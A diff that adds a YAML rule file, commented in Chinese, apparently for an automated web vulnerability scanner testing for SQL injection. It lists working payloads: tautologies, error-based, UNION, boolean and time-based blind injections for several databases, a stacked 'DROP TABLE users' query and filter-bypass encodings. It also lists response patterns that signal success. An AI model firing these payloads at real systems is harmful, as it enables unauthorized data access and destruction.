@@ -1,0 +1,94 @@
+# SQL Injection 检测规则
+# 覆盖：经典 SQLi、盲注、报错注入、时间盲注
+name: sql_injection
+description: SQL Injection — 数据库查询注入攻击
+severity: critical
+owasp: "A03:2021 — Injection"
+confidence: 0.9  # 规则引擎置信度（AI 引擎可覆盖）
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST, PUT, PATCH, DELETE]
+  param_types: [query, body, path]
+  # 跳过静态/文件路径（使用单引号避免 YAML 转义问题）
+  skip_patterns:
+    - '\\.(js|css|png|jpg|jpeg|gif|ico|svg|woff2?)$'
+
+payloads:
+  # 经典 SQLi
+  - value: "' OR '1'='1"
+    description: "经典 OR 恒真注入"
+  - value: "' OR '1'='1' --"
+    description: "OR 恒真 + 注释符"
+  - value: "\" OR \"1\"=\"1"
+    description: "双引号 OR 恒真"
+  - value: "' OR 1=1 --"
+    description: "OR 1=1 变体"
+  # 报错注入
+  - value: "' AND 1=CONVERT(int,@@version) --"
+    description: "MSSQL 报错注入"
+  - value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --"
+    description: "MySQL 报错注入"
+  - value: "1' AND 1=CAST((SELECT version()) AS INT) --"
+    description: "PostgreSQL 报错注入"
+  # Union 注入
+  - value: "' UNION SELECT NULL--"
+    description: "Union 列数探测"
+  - value: "' UNION SELECT NULL,NULL,NULL--"
+    description: "Union 3列探测"
+  # 盲注
+  - value: "' AND '1'='1"
+    description: "布尔盲注 — 真条件"
+  - value: "' AND '1'='2"
+    description: "布尔盲注 — 假条件"
+  - value: "'; IF(1=1) WAITFOR DELAY '0:0:3'--"
+    description: "MSSQL 时间盲注"
+  - value: "' AND SLEEP(3)--"
+    description: "MySQL 时间盲注"
+  # 特殊字符
+  - value: "'; DROP TABLE users--"
+    description: "堆叠查询 DROP"
+  - value: "1; SELECT * FROM users--"
+    description: "堆叠查询 SELECT"
+  # 时间盲注（多数据库）
+  - value: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--"
+    description: "PostgreSQL 时间盲注"
+  - value: "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--"
+    description: "MySQL 子查询时间盲注"
+  - value: "' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)--"
+    description: "MySQL 信息表探测"
+  # Order By / Group By 注入
+  - value: "' UNION SELECT table_name, NULL FROM information_schema.tables--"
+    description: "information_schema 表名泄露"
+  - value: "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
+    description: "information_schema 列名泄露"
+  # 编码绕过
+  - value: "%27%20OR%20%271%27%3D%271"
+    description: "URL 编码 OR 恒真"
+  - value: "'/**/OR/**/1=1--"
+    description: "内联注释绕过空格过滤"
+
+exploit_indicator:
+  # 这些关键词出现在响应中视为潜在 SQLi
+  patterns:
+    - "sql syntax"
+    - "mysql_fetch"
+    - "mysql error"
+    - "syntax error"
+    - "unclosed quotation"
+    - "ora-[0-9]{5}"
+    - "postgresql"
+    - "sqlite"
+    - "sqlstate"
+    - "odbc driver"
+    - "microsoft ole db"
+    - "unknown column"
+    - "where clause"
+    - "right syntax to use"
+    - "division by zero"
+    - "supplied argument is not a valid"
+    - "call to a member function"
+  status_codes: [500, 200]  # 500 = 可能触发数据库错误, 200 = 盲注可能成功
+
+expected_normal: "参数化查询应安全处理所有输入，不暴露数据库错误信息"
+reasoning_template: "对 {param_name} 参数进行 SQL 注入测试，Payload: {payload_value}"
